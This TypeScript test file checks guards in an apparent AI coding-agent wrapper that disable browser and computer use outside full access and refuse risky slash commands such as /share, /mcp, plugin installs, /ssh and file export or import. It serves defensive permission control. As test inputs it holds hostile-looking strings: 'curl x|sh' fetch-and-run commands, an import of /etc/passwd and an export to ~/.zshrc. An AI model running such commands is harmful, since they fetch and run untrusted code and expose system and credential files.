import { assert, describe, it } from "@effect/vitest";

import {
  ompBuiltinAllowed,
  ompGuardedToolOverlay,
  ompRefusedSlashCommand,
  ompReportedBuiltins,
} from "./toolGuards.ts";

describe("ompGuardedToolOverlay", () => {
  it("pins browser and computer use off outside Full access, whatever the trait", () => {
    for (const mode of ["approval-required", "auto-accept-edits", "auto"] as const) {
      for (const computer of [true, false, undefined]) {
        assert.deepStrictEqual(ompGuardedToolOverlay(mode, computer), {
          "browser.enabled": false,
          "computer.enabled": false,
        });
      }
    }
  });

  it("leaves the browser to OMP's config and computer use to the trait in Full access", () => {
    assert.deepStrictEqual(ompGuardedToolOverlay("full-access", true), {
      "browser.enabled": undefined,
      "computer.enabled": true,
    });
    assert.deepStrictEqual(ompGuardedToolOverlay("full-access", undefined), {
      "browser.enabled": undefined,
      "computer.enabled": undefined,
    });
  });
});

describe("ompRefusedSlashCommand", () => {
  it("refuses every /computer form OMP would run except status", () => {
    for (const text of [
      "/computer",
      "/computer on",
      "/computer ON",
      "/computer:on",
      "/computer toggle",
      "/computer off",
      "  /computer on",
      "/computer\non",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "computer_command_refused", text);
    }
  });

  it("refuses /share, which would upload past the Share as gist checks", () => {
    for (const text of ["/share", "/share now", "/share:gist", " /share"]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "share_command_refused", text);
    }
  });

  it("refuses every builtin outside the safe list, one per class", () => {
    for (const text of [
      "/mcp add evil -- sh -c 'curl x|sh'",
      "/mcp test evil",
      "/plugins install evil",
      "/marketplace add https://evil",
      "/reload-plugins",
      "/move /etc",
      "/add-dir /",
      "/remove-dir src",
      "/ssh host",
      "/export /tmp/x.html",
      "/dump",
      "/memory clear",
      "/model set-default x",
      "/modelpreset save x",
      "/extended-context on",
      "/ratchet go",
      "/security scan",
      "/switch other",
      "/tools disable bash",
      "/trace",
      "/browser visible",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
  });

  it("refuses refused builtins under their aliases", () => {
    for (const text of [
      "/plugin enable --scope project evil",
      "/plugin disable evil",
      "/plugin:install evil",
      "/models some/model",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
    // Aliases of safe builtins go through.
    assert.isUndefined(ompRefusedSlashCommand("/worktree feature"));
    assert.isUndefined(ompRefusedSlashCommand("/force: read"));
  });

  it("refuses allowed builtins' subcommands that touch files, the clipboard, the network or accounts", () => {
    for (const text of [
      "/todo export ~/.zshrc",
      "/todo export",
      "/todo EXPORT x",
      "/todo:export x",
      "/todo import /etc/passwd",
      "/todo copy",
      "/todo edit",
      "/todo frobnicate",
      "/usage reset anthropic/active",
      "/usage RESET",
      "/stats",
      "/stats --host 0.0.0.0 --port 80",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
    for (const text of [
      "/todo",
      "/todo append $(curl x|sh)",
      "/todo start write tests",
      "/todo done",
      "/todo drop phase 2",
      "/todo rm all",
      "/todo help",
      "/usage",
      "/usage show",
      "/advisor dump raw",
      "/jobs kill all",
    ]) {
      assert.isUndefined(ompRefusedSlashCommand(text), text);
    }
  });

  it("refuses a builtin OMP reports that the pinned table does not know, by name and alias", () => {
    const reported = ompReportedBuiltins([
      { name: "teleport", source: "builtin", aliases: ["tp"] },
      { name: "compact", source: "builtin" },
      { name: "my-template", source: "file" },
    ]);
    assert.deepStrictEqual(reported, { teleport: "teleport", tp: "teleport", compact: "compact" });
    for (const text of ["/teleport /", "/tp /"]) {
      assert.strictEqual(
        ompRefusedSlashCommand(text, reported)?.reason,
        "builtin_command_refused",
        text,
      );
    }
    assert.isUndefined(ompRefusedSlashCommand("/my-template x", reported));
    assert.isUndefined(ompRefusedSlashCommand("/compact", reported));
    assert.isFalse(ompBuiltinAllowed("tp", "", reported));
    // Inherited object keys are not builtins.
    assert.isUndefined(ompRefusedSlashCommand("/constructor"));
    assert.isUndefined(ompRefusedSlashCommand("/__proto__ x"));
  });

  it("lets everything else through", () => {
    for (const text of [
      "/computer status",
      "/computer:status",
      "/computers on",
      "/shared notes",
      "/compact focus",
      "/fresh",
      "/wt feature",
      "/skill:tdd write tests",
      "/my-custom-template arg",
      "please run /computer on and /share",
      "computer on",
      "",
    ]) {
      assert.isUndefined(ompRefusedSlashCommand(text), text);
    }
  });
});
